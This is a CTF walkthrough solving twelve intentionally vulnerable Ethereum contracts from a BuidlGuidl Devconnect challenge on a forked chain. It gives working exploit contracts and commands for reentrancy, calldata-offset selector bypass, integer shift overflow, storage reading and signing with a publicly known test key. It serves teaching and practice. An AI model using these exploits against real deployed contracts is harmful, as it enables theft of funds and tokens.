---
title: BuidlGuidl CTF Buenos Aires Walkthrough
feed: show
date: 01-11-2026
permalink: /buidlguidl-ctf-buenos-aires
format: list
---

Play the CTF [here](https://ctf-argentina.buidlguidl.com/)

This is the Devconnect Argentina 2025 edition of the BuidlGuidl CTF. If you haven't seen it, I also wrote a walkthrough for the [[BuidlGuidl CTF Bangkok Walkthrough]] from Devcon. A few challenges here are cousins of the ones there, so I'll point back to it where it helps.

The live game has been switched off (`enabled()` returns `false` on the `NFTFlags` contract), so I solved everything on a fork of OP mainnet. This time I went all in on Foundry. Booting up the fork and turning minting back on looks like this:

```bash
anvil --fork-url https://mainnet.optimism.io

cast rpc anvil_impersonateAccount $NFT_OWNER
cast send $NFT_FLAGS "enable()" --from $NFT_OWNER --unlocked
```

One fun gotcha before we even start: I first tried using anvil's default account (`0xf39F...2266`) and Challenge #1 kept reverting with no error message. Turns out that address has an EIP-7702 delegation on OP mainnet (everyone knows its private key, so of course someone attached a sweeper to it). Since it has code, the `_safeMint` in `NFTFlags` tries to call `onERC721Received` on it and fails. A fresh wallet from `cast wallet new` fixed it.

## Challenge #1: **The Greeting**

Same warm-up as last time, except the function is now `registerTeam()` and also takes a team size between 1 and 4.

```bash
cast send $CHALLENGE_1 "registerTeam(string,uint8)" "Dayitva" 1 --private-key $PRIVATE_KEY
```

Every other flag checks that you hold flag #1, so this has to come first.

## Challenge #2: **Show me your key**

The contract wants a key:

```solidity
function mintFlag(bytes32 yourKey) external {
    bytes32 key = keccak256(abi.encodePacked(msg.sender, address(this)));
    require(yourKey == key, "bad key :(");

    INFTFlags(nftContract).mint(tx.origin, 2);
}
```

The "key" is just the hash of our own address and the contract's address, packed together. Nothing secret about it, so we can compute it ourselves and send it right back.

```bash
KEY=$(cast keccak $(cast abi-encode --packed "f(address,address)" $WALLET_ADDRESS $CHALLENGE_2))
cast send $CHALLENGE_2 "mintFlag(bytes32)" $KEY --private-key $PRIVATE_KEY
```

## Challenge #3: **Let me in!**

This is a combination of Challenge #2 and Challenge #6 from Devcon. The function has to be called from a contract (`msg.sender != tx.origin`), and that contract has to answer an `accessKey()` call with the string `"LET_ME_IN"`.

```solidity
require(msg.sender != tx.origin, "Must call from contract");
require(
    keccak256(abi.encodePacked(IChallenge3Solution(msg.sender).accessKey())) ==
        keccak256(abi.encodePacked("LET_ME_IN")),
    "Wrong access key"
);
```

So we just need a contract that has that function and calls `mintFlag()`.

```solidity
//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IChallenge3 {
    function mintFlag() external;
}

contract Challenge3Answer {
    function accessKey() external pure returns (string memory) {
        return "LET_ME_IN";
    }

    function attempt(address challengeContract) public {
        IChallenge3(challengeContract).mintFlag();
    }
}
```

## Challenge #4: **Pay me!**

```solidity
function mintFlag() external {
    _paid = false;

    (bool ok, ) = msg.sender.call("");
    require(ok, "callback failed");
    require(_paid, "not paid");

    INFTFlags(nftContract).mint(tx.origin, 4);

    _paid = false;
}

receive() external payable {
    require(msg.value == EXPECTED_WEI, "bad amount");
    _paid = true;
}
```

`_paid` is reset to `false` at the start of `mintFlag()`, so paying the contract beforehand doesn't help. The only window is the empty `call("")` it makes back to us in the middle of the function. An empty call to a contract lands in its `receive()` or `fallback()` function, so we just pay exactly 1 gwei from there.

```solidity
//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IChallenge4 {
    function mintFlag() external;
}

contract Challenge4Answer {
    address challengeContract;

    constructor(address _challengeContract) payable {
        challengeContract = _challengeContract;
    }

    function attempt() public {
        IChallenge4(challengeContract).mintFlag();
    }

    fallback() external payable {
        (bool ok, ) = challengeContract.call{value: 1 gwei}("");
        require(ok, "payment failed");
    }
}
```

Remember to deploy it with at least 1 gwei so it has something to pay with.

```bash
forge create src/Solutions.sol:Challenge4Answer --value 1gwei --private-key $PRIVATE_KEY --broadcast --constructor-args $CHALLENGE_4
```

## Challenge #5: **Count my Assembly**

```solidity
function mintFlag(uint[] memory data1, uint[] memory data2) public {
    uint256 tokenIdCounter = NFTFlags(nftContract).tokenIdCounter();
    uint256 counter1;
    uint256 counter2;

    assembly ("memory-safe") {
        counter1 := mload(add(data1, 0xD0))
        counter2 := mload(data2)
    }

    require(counter1 == tokenIdCounter, "Wrong counter1");
    require(counter2 == (tokenIdCounter % 0x80), "Wrong counter2");

    NFTFlags(nftContract).mint(tx.origin, 5);
}
```

To make sense of this, we need to know how a dynamic array is laid out in memory. `data1` is a pointer, and at that pointer the first 32 bytes hold the **length** of the array. The elements follow one after the other, 32 bytes each. So element `i` lives at `data1 + 0x20 + 0x20 * i`.

`counter2` is the easier one. `mload(data2)` reads the first 32 bytes, which is the length. So `data2` just needs to have `tokenIdCounter % 128` elements, and their values don't matter.

`counter1` is sneakier. `0xD0` is 208, which isn't a multiple of 32, so the word it reads straddles two elements:

```text
byte 192 ─ data1[5] ─ 224 ─ data1[6] ─ 256
                 208 ──── read ──── 240
```

It takes the second half (low 16 bytes) of `data1[5]` and the first half (high 16 bytes) of `data1[6]`. The counter is a small number, so if `data1[5]` is 0 and `data1[6]` is the counter shifted left by 128 bits, the 32 bytes we read are exactly the counter.

The counter goes up every time anyone mints a flag, so read it right before sending. On my fork it was 151, which makes `data2` 23 elements long.

```bash
N=$(cast call $NFT_FLAGS "tokenIdCounter()(uint256)")
DATA1="[0,0,0,0,0,0,$(cast shl $N 128 --base-out 10)]"
DATA2="[$(python3 -c "print(','.join(['0'] * ($N % 128)))")]"

cast send $CHALLENGE_5 "mintFlag(uint256[],uint256[])" "$DATA1" "$DATA2" --private-key $PRIVATE_KEY
```

## Challenge #6: **Give Me My Points!**

This is the reentrancy challenge from Devcon (#5 there), but with a twist at the end.

```solidity
function upgradeLevel() public {
    require(points[tx.origin] >= POINTS_TO_UPGRADE, "Not enough points");
    points[tx.origin] -= POINTS_TO_UPGRADE;
    levels[tx.origin] += 1;
}

function mintFlag() public {
    require(points[tx.origin] < POINTS_TO_UPGRADE, "Upgrade first");
    require(points[tx.origin] * levels[tx.origin] >= MIN_POWER_TO_MINT, "Not enough powner to mint");
    uint8 key = points[tx.origin] << levels[tx.origin];
    require(key == KEY_VALUE, "Wrong key value");
    INFTFlags(nftContract).mint(tx.origin, 6);
}
```

We need `points < 10`, `points * levels >= 30` and `points << levels == 32`. My first thought was that the last condition only works for things like `1 << 5` or `4 << 3`, and neither has enough "power". The trick is that everything here is a `uint8`, and shifts don't revert on overflow in Solidity, they just silently drop the bits that fall off. So:

- `9 << 5 = 288`, which in a `uint8` is `288 - 256 = 32` ✓
- `9 * 5 = 45 >= 30` ✓
- `9 < 10` ✓

To end up with 9 points and 5 levels, we need `5 * 10 + 9 = 59` points in total, which we can get with the same reentrancy trick as last time.

```solidity
//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IChallenge6 {
    function claimPoints() external;
    function upgradeLevel() external;
    function mintFlag() external;
}

contract Challenge6Answer {
    IChallenge6 challenge;
    uint counter = 0;

    constructor(address _challengeContract) {
        challenge = IChallenge6(_challengeContract);
    }

    function attempt() public {
        challenge.claimPoints();
        for (uint i = 0; i < 5; i++) {
            challenge.upgradeLevel();
        }
        challenge.mintFlag();
    }

    receive() external payable {
        counter += 1;
        if (counter < 59) {
            challenge.claimPoints();
        }
    }
}
```

Everything is tracked by `tx.origin`, so the points go to our wallet even though the contract does the calling.

## Challenge #7: **Calldata FTW**

```solidity
modifier onlyChallenge7() {
    require(msg.sender == address(this), "Only the Challenge7 contract can call this");
    _;
}

modifier onlyMintFlag() {
    bytes32[1] memory selector;
    assembly ("memory-safe") {
        calldatacopy(selector, 68, 4)
    }
    require(selector[0] == mintFlagSelector, "Can only call the mintFlag function");
    _;
}

function mint(bytes memory _data) public onlyMintFlag {
    (bool success, ) = address(this).call(_data);
    require(success, "call failed :(");
}

function allowMinter() public onlyChallenge7 {
    minters[tx.origin] = true;
}

function mintFlag() public onlyChallenge7 {
    require(minters[tx.origin], "Not allowed to mint");
    INFTFlags(nftContract).mint(tx.origin, 7);
}
```

Both `allowMinter()` and `mintFlag()` can only be called by the contract itself, through `mint()`. `mintFlag()` needs `allowMinter()` to have been called first, but `mint()` only lets `mintFlag()` through. Or does it?

To see the gap, we need to know how `bytes` gets ABI-encoded in calldata. For `mint(bytes)` it normally looks like:

```text
0x00  selector       (4 bytes)
0x04  offset         where the bytes start, normally 0x20
0x24  length         (byte 36)
0x44  the bytes      (byte 68)
```

In the normal encoding, byte 68 is where `_data` starts, so the modifier is checking the first 4 bytes of `_data`. But it reads a **fixed** position. The actual decoding follows the offset, which we control! So we can leave a decoy `mintFlag()` selector at byte 68 and point the offset somewhere else that holds `allowMinter()`.

```text
0x00  7ba0e2e7    mint(bytes)
0x04  ...0060     offset → bytes start at 0x04 + 0x60 = byte 100
0x24  ...0000     padding
0x44  e00d023f    mintFlag() ← what the modifier checks (byte 68)
0x64  ...0004     length = 4 (byte 100)
0x84  0fd16506    allowMinter() ← what actually gets called
```

```bash
pad() { printf "%-64s" "${1#0x}" | tr ' ' 0; }

DATA="$(cast sig 'mint(bytes)')"\
"$(cast to-uint256 0x60 | cut -c3-)"\
"$(cast to-uint256 0 | cut -c3-)"\
"$(pad $(cast sig 'mintFlag()'))"\
"$(cast to-uint256 4 | cut -c3-)"\
"$(pad $(cast sig 'allowMinter()'))"

cast send $CHALLENGE_7 $DATA --private-key $PRIVATE_KEY
```

Now that we're a minter, a completely normal call does the rest:

```bash
cast send $CHALLENGE_7 "mint(bytes)" $(cast sig "mintFlag()") --private-key $PRIVATE_KEY
```

## Challenge #8: **Locked**

The first lock is the same password puzzle as Challenge #9 from Devcon, so the same trick applies: nothing is private on-chain. Reading the storage:

```bash
cast storage $CHALLENGE_8 0   # nftContract
cast storage $CHALLENGE_8 1   # password
cast storage $CHALLENGE_8 2   # count
```

```bash
0x0000000000000000000000002ce4f61aecfbc282e9fa3459e2cb771c8dfe50a7
0xfc99bc93a72ca17d0a3a3e47f97191723b801619a6b4cc2ce0006e24f63e781f
0x0000000000000000000000000000000000000000000000000000000000000009
```

With `count = 9`, the mask zeroes out byte `31 - 9 = 22` (counting from the right). This time I computed it with a Python one-liner instead of deploying a contract:

```bash
python3 -c "pw=0xfc99bc93a72ca17d0a3a3e47f97191723b801619a6b4cc2ce0006e24f63e781f; c=9; mask=((1<<256)-1) ^ (0xFF << ((31-(c%32))*8)); print('0x%064x' % (pw & mask))"
# 0xfc99bc93a72ca17d0a003e47f97191723b801619a6b4cc2ce0006e24f63e781f
```

The new part is the other three locks:

```solidity
modifier lock2() {
    require(msg.sender.balance >= 2, "Insufficient balance");
    _;
}

modifier lock3() {
    require(payable(msg.sender).send(1) == false, "It should fail to send ether");
    _;
}

modifier lock4() {
    require(payable(msg.sender).send(2) == true, "Failed to send ether");
    _;
}
```

Sending 1 wei to us has to **fail**, but sending 2 wei has to **succeed**. An EOA can't do that, since it always accepts ETH, so we need a contract whose `receive()` is picky about the amount. `send()` only forwards 2300 gas, but a `require` on `msg.value` easily fits in that.

```solidity
//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IChallenge8 {
    function mintFlag(bytes32 _password) external payable;
}

contract Challenge8Answer {
    constructor() payable {}

    function attempt(address challengeContract, bytes32 password) public {
        IChallenge8(challengeContract).mintFlag{value: 2}(password);
    }

    receive() external payable {
        require(msg.value != 1, "no thanks");
    }
}
```

`mintFlag()` also needs exactly 2 wei sent with it, and lock2 checks our balance *after* that has been sent. So I deployed the contract with 4 wei to be safe.

```bash
forge create src/Solutions.sol:Challenge8Answer --value 4wei --private-key $PRIVATE_KEY --broadcast
cast send $ANSWER_8 "attempt(address,bytes32)" $CHALLENGE_8 $NEW_PASSWORD --private-key $PRIVATE_KEY
```

## Challenge #9: **The unverified**

`Challenge9.sol` in the repo just says `// Nothing to see here :)`, and the deployed contract is unverified. Last time I used the Etherscan decompiler, but Foundry can get us surprisingly far by itself. First, the function selectors in the bytecode:

```bash
cast selectors $(cast code $CHALLENGE_9)
```

```text
0x23cfec7e	address,bytes	nonpayable
0x3092afd5	address      	nonpayable
0x715018a6	             	nonpayable
0x8da5cb5b	             	view
0x983b2d56	address      	nonpayable
0xaa271e1a	address      	view
0xd56d229d	             	view
0xf2fde38b	address      	nonpayable
```

Most of these are recognizable: `owner()`, `transferOwnership()` and `renounceOwnership()` from `Ownable`, `nftContract()`, plus `addMinter`, `removeMinter` and `isMinter`. The odd one out is `0x23cfec7e(address,bytes)`, and an address plus some bytes smells a lot like a signature check. Pulling the readable strings out of the bytecode confirms it:

```text
'Ethereum Signed Message:'
'Invalid signature. Message to sign: keccak256(abi.encode("BG CTF Challenge 9", msg.sender))'
```

So who is a minter? The deploy script gives it away again, and it's the exact same trick as Challenge #4 from Devcon:

```solidity
string memory hardhatMnemonic = "test test test test test test test test test test test junk";
uint256 challenge9AccountPrivateKey = vm.deriveKey(hardhatMnemonic, 12);
```

That's the 13th account from the default Hardhat mnemonic, `0xFABB0ac9d68B0B445fB7357272Ff202C5651694a`, and `isMinter()` confirms it. No ethers.js script this time, `cast` does it all:

```bash
SIGNER_PK=$(cast wallet private-key --mnemonic "test test test test test test test test test test test junk" --mnemonic-index 12)
HASH=$(cast keccak $(cast abi-encode "f(string,address)" "BG CTF Challenge 9" $WALLET_ADDRESS))
SIG=$(cast wallet sign --private-key $SIGNER_PK $HASH)

cast send $CHALLENGE_9 "0x23cfec7e$(cast abi-encode 'f(address,bytes)' 0xFABB0ac9d68B0B445fB7357272Ff202C5651694a $SIG | cut -c3-)" --private-key $PRIVATE_KEY
```

`cast wallet sign` adds the "Ethereum Signed Message" prefix for us. Also note that it's `abi.encode` and not `abi.encodePacked` this time.

## Challenge #10: **Who can call me?**

Another CREATE2 challenge, similar to #11 from Devcon, but with two conditions this time:

```solidity
require((senderLast & 0xF) == (originLast & 0xF), "Wrong sender/origin address");
require((senderFirst & 0xF0) == (contractFirst & 0xF0), "Wrong sender/contract address");
```

Our helper contract's address has to end in the same hex character as our wallet, and start with the same hex character as the challenge contract. My wallet ended in `9`, and the challenge is at `0x9DAe...`, so I needed an address that looks like `0x9...9`.

Last time I wrote a factory and looped through salts in Solidity. This time I found out Foundry has a salt miner built in, `cast create2`, and the deterministic CREATE2 deployer (`0x4e59...956C`) already exists on OP mainnet, so no factory is needed.

```solidity
//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IChallenge10 {
    function mintFlag() external;
}

contract Challenge10Answer {
    function attempt() public {
        IChallenge10(0x9DAeB05A14EA75f60593ED9a673e699eec0565ff).mintFlag();
    }
}
```

```bash
DEPLOYER=0x4e59b44847b379578588920cA78FbF26c0B4956C
INIT_CODE=$(forge inspect src/Solutions.sol:Challenge10Answer bytecode)

cast create2 --starts-with 9 --ends-with 9 --deployer $DEPLOYER --init-code $INIT_CODE
# Address: 0x993Ef8C29b972E18D546491E2a61d5355E5f9179
# Salt: 0x8d87453d583af31a559f1f69ec913a01adfba56bea2cb3ec1cb7430041a1f7f9
```

It found one in about a millisecond. The deployer takes the salt followed by the init code as plain calldata:

```bash
cast send $DEPLOYER "$SALT${INIT_CODE#0x}" --private-key $PRIVATE_KEY
cast send 0x993Ef8C29b972E18D546491E2a61d5355E5f9179 "attempt()" --private-key $PRIVATE_KEY
```

## Challenge #11: **Give me the block!**

This is Challenge #12 from Devcon with one extra condition at the end:

```solidity
bytes memory mixHash = ls[13].toBytes();

uint256 random = uint256(keccak256(abi.encodePacked(mixHash, address(this), msg.sender))) % 10;

require(random < counts[msg.sender], "Not enough pre-mints");
```

`preMintFlag()` now also increments `counts[msg.sender]`. The "random" number is always between 0 and 9, so if we call `preMintFlag()` 10 times, `random < counts` always passes and there is no luck involved. Each call has to be in a different block (`blocks[block.number]` gets marked as used), and `blockNumber` gets overwritten each time, so the header we need is the one two blocks after the **last** pre-mint.

Last time, building the RLP-encoded header was by far the hardest part: fetching the block, padding odd-length hex, making sure `0x0` became `0x`, and hoping I had every field in the right order. It turns out `cast` can just give you the raw RLP-encoded header:

```bash
cast block $BLOCK_NUMBER --raw
```

I checked it on a real OP mainnet block to be sure, and the `keccak256` of the output matches the block hash exactly. Putting it together:

```bash
for i in $(seq 10); do cast send $CHALLENGE_11 "preMintFlag()" --private-key $PRIVATE_KEY; done

N=$(cast call $CHALLENGE_11 "blockNumber(address)(uint256)" $WALLET_ADDRESS)
# wait until block N+2 exists
RLP=$(cast block $((N+2)) --raw)

cast send $CHALLENGE_11 "mintFlag(bytes)" $RLP --private-key $PRIVATE_KEY
```

The flag is minted to `msg.sender` here, so this has to be called directly from your wallet.

## Challenge #12: **Conquer the game**

The final boss is spread across seven contracts: `Challenge12`, a `HeroNFT`, a `GoldToken`, an `Inventory`, a `Quest`, a `Dungeon` and a `Victory`. It looks intimidating, but most of the side contracts are just a `tx.origin`-keyed setter that anyone can call. Here's the main function:

```solidity
modifier winner() {
    require(Challenge12Victory(challenge12Victory).winner(), "Not winner");
    _;
}

modifier rich() {
    require(
        Challenge12GoldToken(challenge12GoldToken).balanceOf(address(~bytes20(tx.origin))) >= 1 ether,
        "Insufficient balance"
    );
    _;
}

function mintFlag(uint256 tokenId) public winner rich {
    Challenge12GoldToken(challenge12GoldToken).transferFrom(msg.sender, address(this), 1 ether);

    uint256 inventoryValue = stringToUint(Challenge12HeroNFT(challenge12HeroNFT).tokenURI(tokenId));
    Challenge12Inventory(challenge12Inventory).setValue(inventoryValue);

    bytes32 hash = keccak256(
        abi.encodePacked(
            blockhash(block.number - 1),
            address(this),
            Challenge12Inventory(challenge12Inventory).inventory(tx.origin)
        )
    );

    uint256 balance = Challenge12GoldToken(challenge12GoldToken).balanceOf(msg.sender);

    require(balance == uint256(hash) % 100 ether, "Wrong balance");
    require(balance == Challenge12Dungeon(challenge12Dungeon).getCurrentPosition(), "Wrong position");
    require(
        Challenge12GoldToken(challenge12GoldToken).balanceOf(tx.origin)
            == Challenge12GoldToken(challenge12GoldToken).balanceOf(address(~bytes20(tx.origin))),
        "Wrong enemy balance"
    );

    require(
        Challenge12GoldToken(challenge12GoldToken).allowance(msg.sender, address(this))
            == Challenge12Inventory(challenge12Inventory).inventory(tx.origin),
        "Wrong allowance"
    );

    NFTFlags(nftContract).mint(tx.origin, 12);
}
```

Going through it piece by piece:

1. **Getting gold.** The `GoldToken` can only be minted by `NFTFlags`, which brings us back to `onERC721Received` (Challenge #10 from Devcon all over again). If we `safeTransferFrom` any of our flags to the `NFTFlags` contract, with the token ID of our **challenge #1 flag** as `data`, it sends the flag straight back and mints us 1000 gold.

   ```bash
   cast send $NFT_FLAGS "safeTransferFrom(address,address,uint256,bytes)" $WALLET_ADDRESS $NFT_FLAGS $FLAG_2_TOKEN_ID $(cast abi-encode "f(uint256)" $FLAG_1_TOKEN_ID) --private-key $PRIVATE_KEY
   ```

2. **winner.** `Victory.winner()` needs `Dungeon.dungeon(tx.origin) > 0` and `Victory.victory(tx.origin) == true`. Both are public setters: `setPosition()` and `free(true)`.

3. **rich and the "enemy".** `address(~bytes20(tx.origin))` flips every bit of our address. Nobody has the key to that address, but it doesn't need one, it just needs a gold balance of at least 1 and **equal to ours**. `GoldToken` overrides `transfer()` with a bunch of HeroNFT checks, but it doesn't override `transferFrom()`. So we approve our contract and it moves the gold for us.

4. **inventoryValue.** This comes from parsing the `tokenURI` of a HeroNFT, and anyone can mint a HeroNFT with whatever URI they like. But look closely at `stringToUint`:

   ```solidity
   res = res * 10 + (uint256(uint8(b[i])) - 0x35);
   ```

   It subtracts `0x35` (the character `'5'`) instead of `0x30` (`'0'`). So `"6"` parses to 1, and any digit below 5 underflows and reverts. I minted a hero with the URI `"6"`.

5. **The balance.** Our gold balance (after the contract pulls 1 gold) must equal `keccak256(previous blockhash, Challenge12, inventoryValue) % 100 gold`. It changes every block, so it can't be set up ahead of time. It has to be computed inside the same transaction, which means `msg.sender` has to be a contract. It also has to equal `Dungeon.getCurrentPosition()`, which is `quest * dungeon`. So we set the quest to 1 and the dungeon position to the target balance.

6. **The allowance.** After the 1 gold is pulled, our remaining allowance must equal `inventoryValue`, so we approve `1 gold + 1 wei`.

The one thing that tripped me up: to make our balance equal the enemy's, the leftover gold gets split in half, and if the leftover is an odd number of wei, the halves can't be equal. In that case the contract pulls one extra wei and burns it. Here's everything in one contract:

```solidity
//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

contract Challenge12Answer {
    IChallenge12 constant challenge = IChallenge12(0x7b52cf6BBb1464F68460B2DA2E1Fc74D32bE9387);
    IERC20 constant gold = IERC20(0x9FE0D8620C8D82CfaDF047B2B1A4C56E27218b6C);
    IHero constant hero = IHero(0x12b802C1D6615A51e76bF515895Aa21d15e04892);
    IQuest constant quest = IQuest(0x6dEAf404122dB11C9d2a1cBd48fcfD4Ee839428D);
    IDungeon constant dungeon = IDungeon(0x2aBE1f54D303AE77575076165167B4A2eDcE4D75);
    IVictory constant victory = IVictory(0x3A634fC6161BFE49F30304F5A10b802B8d4C622C);

    function attempt() public {
        // "6" parses to 1 because stringToUint subtracts 0x35 ('5') instead of 0x30 ('0')
        uint256 tokenId = hero.mint("6");
        uint256 inventoryValue = 1;

        uint256 target = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), address(challenge), inventoryValue))
        ) % 100 ether;

        quest.setCurrentQuest(1);
        dungeon.setPosition(bytes32(target));
        victory.free(true);

        address me = tx.origin;
        address enemy = address(~bytes20(me));

        // Hold target + 1 gold here, since mintFlag pulls 1 gold before checking our balance
        uint256 pull = target + 1 ether;
        uint256 remaining = gold.balanceOf(me) - pull;
        if (remaining % 2 == 1) {
            // Odd leftover can't be split evenly, so pull 1 extra wei and burn it
            gold.transferFrom(me, address(this), 1);
            gold.burn(1);
            remaining -= 1;
        }
        gold.transferFrom(me, address(this), pull);
        gold.transferFrom(me, enemy, remaining / 2);

        gold.approve(address(challenge), 1 ether + inventoryValue);

        challenge.mintFlag(tokenId);
    }
}
```

(The interfaces are just the functions used above, so I've left them out.) Then we approve it to spend our gold and call it:

```bash
cast send $GOLD_TOKEN "approve(address,uint256)" $ANSWER_12 $(cast max-uint) --private-key $PRIVATE_KEY
cast send $ANSWER_12 "attempt()" --private-key $PRIVATE_KEY
```

Afterwards, our wallet and the enemy address each had exactly `485.047702411719111785` gold, and the 12th flag was ours!
